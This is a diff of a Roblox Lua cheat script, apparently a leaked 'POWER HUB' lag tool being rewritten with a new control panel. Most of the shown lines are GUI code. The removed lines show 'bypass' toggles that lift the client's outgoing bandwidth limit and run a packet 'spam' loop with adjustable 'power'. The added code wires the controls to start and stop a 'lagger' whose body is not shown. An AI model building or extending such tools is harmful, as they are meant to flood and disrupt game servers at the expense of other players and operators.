+    ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
+    ToggleBtn.Font = Enum.Font.GothamBold
+    ToggleBtn.TextSize = 16
+    ToggleBtn.Parent = Panel
+    createCorner(ToggleBtn, 6)
+    createStroke(ToggleBtn, CONFIG.Colors.Accent, 1, 0.5)
+
+    local function createOptionRow(yPos, text)
+        local frame = Instance.new("Frame")
+        frame.Size = CONFIG.Size.OptionFrame
+        frame.Position = UDim2.new(0, 4, 0, yPos)
+        frame.BackgroundColor3 = CONFIG.Colors.OptionBackground
+        frame.Parent = Panel
+        createCorner(frame, 6)
+
+        local title = Instance.new("TextLabel")
+        title.Size = UDim2.new(0.5, 0, 1, 0)
+        title.Position = UDim2.new(0, 10, 0, 0)
+        title.BackgroundTransparency = 1
+        title.Text = text
+        title.TextColor3 = CONFIG.Colors.TextPrimary
+        title.Font = Enum.Font.GothamSemibold
+        title.TextSize = 12
+        title.TextXAlignment = Enum.TextXAlignment.Left
+        title.Parent = frame
+
+        return frame, title
+    end
+
+    BindFrame, BindTitle = createOptionRow(84, "Bind")
+    BindBtn = Instance.new("TextButton")
+    BindBtn.Size = UDim2.new(0, 44, 0, 20)
+    BindBtn.Position = UDim2.new(1, -50, 0.5, -10)
+    BindBtn.BackgroundColor3 = CONFIG.Colors.Accent
+    BindBtn.Text = currentBind.Name
+    BindBtn.TextColor3 = CONFIG.Colors.TextPrimary
+    BindBtn.Font = Enum.Font.GothamBold
+    BindBtn.TextSize = 12
+    BindBtn.Parent = BindFrame
+    createCorner(BindBtn, 4)
+
+    Option1Frame, Opt1Title = createOptionRow(122, "Lag 1:")
+    Opt1Minus = Instance.new("TextButton")
+    Opt1Minus.Size = UDim2.new(0, 18, 0, 18)
+    Opt1Minus.Position = UDim2.new(1, -68, 0.5, -9)
+    Opt1Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
+    Opt1Minus.Text = "-"
+    Opt1Minus.TextColor3 = CONFIG.Colors.TextPrimary
+    Opt1Minus.Font = Enum.Font.GothamBold
+    Opt1Minus.Parent = Option1Frame
+    createCorner(Opt1Minus, 4)
+
+    Opt1Val = Instance.new("TextLabel")
+    Opt1Val.Size = UDim2.new(0, 30, 1, 0)
+    Opt1Val.Position = UDim2.new(1, -48, 0, 0)
+    Opt1Val.BackgroundTransparency = 1
+    Opt1Val.Text = tostring(opt1Value)
+    Opt1Val.TextColor3 = CONFIG.Colors.Accent
+    Opt1Val.Font = Enum.Font.GothamBold
+    Opt1Val.TextSize = 13
+    Opt1Val.Parent = Option1Frame
+
+    Opt1Plus = Instance.new("TextButton")
+    Opt1Plus.Size = UDim2.new(0, 18, 0, 18)
+    Opt1Plus.Position = UDim2.new(1, -18, 0.5, -9)
+    Opt1Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
+    Opt1Plus.Text = "+"
+    Opt1Plus.TextColor3 = CONFIG.Colors.TextPrimary
+    Opt1Plus.Font = Enum.Font.GothamBold
+    Opt1Plus.Parent = Option1Frame
+    createCorner(Opt1Plus, 4)
+
+    Option2Frame, Opt2Title = createOptionRow(160, "Lag 2:")
+    Opt2Minus = Instance.new("TextButton")
+    Opt2Minus.Size = UDim2.new(0, 18, 0, 18)
+    Opt2Minus.Position = UDim2.new(1, -68, 0.5, -9)
+    Opt2Minus.BackgroundColor3 = CONFIG.Colors.MainBackground
+    Opt2Minus.Text = "-"
+    Opt2Minus.TextColor3 = CONFIG.Colors.TextPrimary
+    Opt2Minus.Font = Enum.Font.GothamBold
+    Opt2Minus.Parent = Option2Frame
+    createCorner(Opt2Minus, 4)
+
+    Opt2Val = Instance.new("TextLabel")
+    Opt2Val.Size = UDim2.new(0, 30, 1, 0)
+    Opt2Val.Position = UDim2.new(1, -48, 0, 0)
+    Opt2Val.BackgroundTransparency = 1
+    Opt2Val.Text = tostring(opt2Value)
+    Opt2Val.TextColor3 = CONFIG.Colors.Accent
+    Opt2Val.Font = Enum.Font.GothamBold
+    Opt2Val.TextSize = 13
+    Opt2Val.Parent = Option2Frame
+
+    Opt2Plus = Instance.new("TextButton")
+    Opt2Plus.Size = UDim2.new(0, 18, 0, 18)
+    Opt2Plus.Position = UDim2.new(1, -18, 0.5, -9)
+    Opt2Plus.BackgroundColor3 = CONFIG.Colors.MainBackground
+    Opt2Plus.Text = "+"
+    Opt2Plus.TextColor3 = CONFIG.Colors.TextPrimary
+    Opt2Plus.Font = Enum.Font.GothamBold
+    Opt2Plus.Parent = Option2Frame
+    createCorner(Opt2Plus, 4)
+
+    makeDraggable(MainFrame)
+end
+
+function updateToggleUI()
+    if laggerEnabled then
+        ToggleBtn.Text = "ENABLED"
+        ToggleBtn.TextColor3 = CONFIG.Colors.TextPrimary
+        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonEnabled
     else
-        if spamThread then task.cancel(spamThread) end
-        bomb = nil
-        NetworkClient:SetOutgoingKBPSLimit(0)
+        ToggleBtn.Text = "DISABLED"
+        ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
+        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
     end
 end
 
-local function ToggleMobileBypass()
-    running = not running
-    updateToggleVisuals(running)
-    if running then
-        NetworkClient:SetOutgoingKBPSLimit(math.huge)
-        restartSpamLoop()
-    else
-        if spamThread then task.cancel(spamThread) end
-        bomb = nil
-        NetworkClient:SetOutgoingKBPSLimit(0)
-    end
-end
+local function setupConnections()
+    CloseBtn.MouseButton1Click:Connect(function()
+        MainFrame.Visible = false
+        ReopenBtn.Visible = true
+    end)
 
-local function SwitchMode()
-    if running then
-        running = false
-        if spamThread then task.cancel(spamThread) end
-        bomb = nil
-        NetworkClient:SetOutgoingKBPSLimit(0)
-        updateToggleVisuals(false)
-    end
-    
-    currentMode = currentMode == "PC" and "Mobile" or "PC"
-    Config.Mode = currentMode
-    
-    PCElements.Visible = currentMode == "PC"
-    MobileElements.Visible = currentMode == "Mobile"
-    
-    if currentMode == "PC" then
-        ModeSwitchBtn.Text = "PC"
-        PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
-    else
-        ModeSwitchBtn.Text = "MOB"
-        MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
-    end
-    
-    SaveConfig()
-    updateCanvas()
-end
+    ReopenBtn.MouseButton1Click:Connect(function()
+        MainFrame.Visible = true
+        ReopenBtn.Visible = false
+    end)
 
-PCToggleBtn.MouseButton1Click:Connect(function()
-    if currentMode == "PC" then TogglePCBypass() end
-end)
-MobileToggleBtn.MouseButton1Click:Connect(function()
-    if currentMode == "Mobile" then ToggleMobileBypass() end
-end)
-ModeSwitchBtn.MouseButton1Click:Connect(SwitchMode)
+    ToggleBtn.MouseButton1Click:Connect(function()
+        toggleLagger()
+        saveConfig()
+    end)
 
--- Power inputs
-PCPowerInput.FocusLost:Connect(function()
-    local numericValue = tonumber(PCPowerInput.Text)
-    if numericValue then
-        local clampedValue = math.clamp(numericValue, 10000, 150000)
-        Config.PCPower = clampedValue
-        PCPowerInput.Text = tostring(clampedValue)
-    else
-        Config.PCPower = 97000
-        PCPowerInput.Text = "97000"
-    end
-    PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
-    SaveConfig()
-    if running and currentMode == "PC" then restartSpamLoop() end
-end)
+    BindBtn.MouseButton1Click:Connect(function()
+        BindBtn.Text = "..."
+        isBinding = true
+    end)
 
-MobilePowerInput.FocusLost:Connect(function()
-    local numericValue = tonumber(MobilePowerInput.Text)
-    if numericValue then
-        local clampedValue = math.clamp(numericValue, 10000, 100000)
-        Config.MobilePower = clampedValue
-        MobilePowerInput.Text = tostring(clampedValue)
-    else
-        Config.MobilePower = 72000
-        MobilePowerInput.Text = "72000"
-    end
-    MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
-    SaveConfig()
-    if running and currentMode == "Mobile" then restartSpamLoop() end
-end)
-
--- Keybind
-local listeningForKey = false
-PCKeybindBtn.MouseButton1Click:Connect(function()
-    listeningForKey = true
-    PCKeybindBtn.Text = "..."
-    PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
-end)
-UserInputService.InputBegan:Connect(function(input, processed)
-    if processed then return end
-    if listeningForKey then
-        if input.UserInputType == Enum.UserInputType.Keyboard then
-            Config.Keybind = input.KeyCode.Name
-            PCKeybindBtn.Text = Config.Keybind
-            PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            listeningForKey = false
-            SaveConfig()
+    UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if isBinding and input.UserInputType == Enum.UserInputType.Keyboard then
+            currentBind = input.KeyCode
+            BindBtn.Text = currentBind.Name
+            isBinding = false
+            saveConfig()
+        elseif not gameProcessed and input.KeyCode == currentBind then
+            MainFrame.Visible = not MainFrame.Visible
+            ReopenBtn.Visible = not MainFrame.Visible
         end
-    else
-        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
-            if currentMode == "PC" then TogglePCBypass() end
+    end)
+
+    Opt1Minus.MouseButton1Click:Connect(function()
+        opt1Value = math.max(1, opt1Value - 1)
+        Opt1Val.Text = tostring(opt1Value)
+        cfg.lag1 = opt1Value
+        if laggerEnabled then
+            stopLagger()
+            task.wait(0.1)
+            startLagger()
         end
-    end
-end)
+        saveConfig()
+    end)
+    Opt1Plus.MouseButton1Click:Connect(function()
+        opt1Value = math.min(5000, opt1Value + 1)
+        Opt1Val.Text = tostring(opt1Value)
+        cfg.lag1 = opt1Value
+        if laggerEnabled then
+            stopLagger()
+            task.wait(0.1)
+            startLagger()
+        end
+        saveConfig()
+    end)
 
--- Draggable
-local dragging, dragStart, startPos
-Header.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
-        local delta = input.Position - dragStart
-        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
-end)
+    Opt2Minus.MouseButton1Click:Connect(function()
+        opt2Value = math.max(1, opt2Value - 10)
+        Opt2Val.Text = tostring(opt2Value)
+        cfg.lag2 = opt2Value
+        saveConfig()
+    end)
+    Opt2Plus.MouseButton1Click:Connect(function()
+        opt2Value = math.min(5000, opt2Value + 10)
+        Opt2Val.Text = tostring(opt2Value)
+        cfg.lag2 = opt2Value
+        saveConfig()
+    end)
 
--- Initialize
-PCKeybindBtn.Text = Config.Keybind
-PCPowerInput.Text = tostring(Config.PCPower)
-MobilePowerInput.Text = tostring(Config.MobilePower)
-PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
-MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
-PCElements.Visible = Config.Mode == "PC"
-MobileElements.Visible = Config.Mode == "Mobile"
-ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOB"
-updateCanvas()
+    LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(1.2)
+        if laggerEnabled then
+            stopLagger()
+            task.wait(0.3)
+            startLagger()
+        end
+    end)
+end
 
-print("POWER HUB⚡️ Minimized Version Loaded")
+local function init()
+    createGUI()
+    setupConnections()
+    loadConfig()
+    updateToggleUI()
+end
+
+init()
+
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
